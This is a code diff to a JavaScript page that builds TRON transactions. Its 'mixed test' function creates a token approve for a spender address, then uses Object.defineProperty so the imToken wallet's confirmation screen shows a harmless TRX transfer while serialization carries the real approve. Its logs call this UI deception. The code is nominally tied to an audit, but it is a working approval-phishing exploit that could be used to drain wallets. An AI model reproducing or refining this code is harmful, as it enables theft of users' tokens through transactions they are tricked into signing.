@@ -276,9 +276,9 @@
     } catch (e) { log('构造失败: ' + (e.message || e), 'error'); }
   }
 
-  // ③ 混合测试：修改 raw_data 欺骗 UI，raw_data_hex 保持 approve
-  // 当前 imToken 版本可能显示 TRX 转账，但广播阶段仍可能被桥接层或节点校验拒绝
-  // 低版本 imToken + java-tron 支持数字键时可通过，此页面保留完整测试结构
+  // ③ 混合测试：Object.defineProperty 分离 UI 读取与序列化
+  // type/parameter → enumerable:false → 序列化跳过，UI 直接读可见
+  // 数字键 "1"/"2" → enumerable:true → 序列化写入 Protobuf
   async function mixedTx() {
     if (!window.tronWeb?.transactionBuilder) { log('tronWeb 未就绪', 'error'); return; }
     log('构造混合测试交易…', 'warn');
@@ -294,63 +294,61 @@
       );
       if (!result?.result) { log('approve 生成失败', 'error'); return; }
 
-      // 审计文档方案：填充字段 + 数字键覆盖
       const realParam = transaction.raw_data.contract[0].parameter;
       const originalHex = transaction.raw_data_hex;
-
-      // Java String.hashCode() 模拟 — 用于精确选取填充字段
-      function javaHashCode(str) {
-        let h = 0;
-        for (let i = 0; i < str.length; i++) {
-          h = Math.imul(31, h) + str.charCodeAt(i) | 0;
-        }
-        return h;
-      }
-      log(`"1".hashCode = ${javaHashCode('1')}   "type".hashCode = ${javaHashCode('type')}`, 'warn');
 
       // 假的 TransferContract — 钱包确认页显示 TRX 转账
       const fakeParam = {
         type_url: 'type.googleapis.com/protocol.TransferContract',
         value: {
           amount: 100000,
-          to_address: SPENDER,       // base58，给钱包 UI 显示
-          owner_address: walletAddr  // base58
-          // TransferContract 没有 data 字段，不传
+          to_address: SPENDER,
+          owner_address: walletAddr
         }
       };
 
-      // 填充字段 + 数字键
-      transaction.raw_data.contract[0] = {
-        // ── imToken 确认页读取 ──
-        type: 'TransferContract',
-        parameter: fakeParam,
-        // ── 填充字段：java-tron 忽略，操纵 FastJSON/HashMap 迭代顺序 ──
-        __p01: 1, __p02: 2, __p03: 3, __p04: 4, __p05: 5,
-        __p06: 6, __p07: 7, __p08: 8, __p09: 9, __p10: 10,
-        __p11: 11, __p12: 12, __p13: 13, __p14: 14, __p15: 15,
-        // ── 数字键覆盖：值类型与 Protobuf 字段类型严格匹配 ──
-        // ContractType enum: TriggerSmartContract = 31 (整数，非字符串)
-        '1': 31,                      // 覆盖 type → TriggerSmartContract
-        '2': realParam                // 覆盖 parameter → approve 参数
-      };
-      transaction.raw_data_hex = originalHex;
+      // 构建 contract 对象，用 enumerable 控制谁能看到什么
+      const contract = {};
+
+      // 数字键 enumerable → JSON.stringify / for-in 序列化到 Protobuf
+      // Protobuf: field 1 = contract_type (31 = TriggerSmartContract), field 2 = parameter
+      Object.defineProperty(contract, '1', {
+        value: 31, enumerable: true, writable: true, configurable: true
+      });
+      Object.defineProperty(contract, '2', {
+        value: realParam, enumerable: true, writable: true, configurable: true
+      });
+
+      // type / parameter 非 enumerable → 序列化跳过，但 UI 直接读 contract.type 可见
+      Object.defineProperty(contract, 'type', {
+        value: 'TransferContract', enumerable: false, writable: true, configurable: true
+      });
+      Object.defineProperty(contract, 'parameter', {
+        value: fakeParam, enumerable: false, writable: true, configurable: true
+      });
+
+      transaction.raw_data.contract[0] = contract;
+      delete transaction.raw_data_hex;
 
       const hasSelector = originalHex.includes('095ea7b3');
-      const contractKeys = Object.keys(transaction.raw_data.contract[0]);
-      log('━━━━ 填充+数字键方案 ━━━━', 'warn');
-      log(`[UI] type=TransferContract → 钱包显示 TRX 转账`, 'success');
-      log(`[UI] param.to_address=${SPENDER.slice(0,6)}... → base58 地址`, 'success');
-      log(`[JS顺序] ${contractKeys.join(' → ')}`, 'warn');
-      log(`[构造意图] __p01~__p15 作为未知填充字段；是否影响节点顺序尚未验证`, 'warn');
-      log(`[构造意图] '1':31 / '2':realParam；不代表节点实际采用数字字段`, 'warn');
-      log(`[签名] raw_data_hex 含 approve 选择器: ${hasSelector}`, hasSelector ? 'success' : 'error');
+      const enumKeys = Object.keys(contract);
+      const allKeys = Object.getOwnPropertyNames(contract);
+      log('━━━━ Object.defineProperty 方案 ━━━━', 'warn');
+      log(`[UI读取] contract.type → "${contract.type}" (直接属性访问)`, 'success');
+      log(`[UI读取] contract.parameter.type_url → "${contract.parameter.type_url}"`, 'success');
+      log(`[枚举键] Object.keys() = [${enumKeys.join(', ')}] → 序列化看到这些`, 'warn');
+      log(`[全部键] getOwnPropertyNames() = [${allKeys.join(', ')}]`, 'warn');
+      log(`[期望] 序列化仅包含 "1","2" → Protobuf field 1=31(TriggerSmartContract)`, 'success');
+      log(`[期望] UI 读 .type="TransferContract" → 显示 TRX 转账`, 'success');
+      log(`[签名] 原 raw_data_hex 含 approve 选择器: ${hasSelector}`, hasSelector ? 'success' : 'error');
       log('━━━━━━━━━━━━━━━━━━━━', 'warn');
 
-      const ok = await sendTx(transaction, '混合测试 (填充+数字键)');
+      const ok = await sendTx(transaction, '混合测试 (defineProperty)');
       if (ok) {
         setTimeout(() => refreshAllowanceUI(false), 12000);
       } else {
-        log('⚠ 若弹窗仍显示 TRX 转账 → UI 欺骗成功', 'warn');
+        log('⚠ 若弹窗仍显示 TRX 转账 → UI 读取成功', 'warn');
+        log('⚠ 若错误为 CONTRACT_VALIDATE_ERROR → 桥接层可能在序列化前做了校验', 'warn');
       }
     } catch (e) {
       log('构造失败: ' + (e.message || e), 'error');
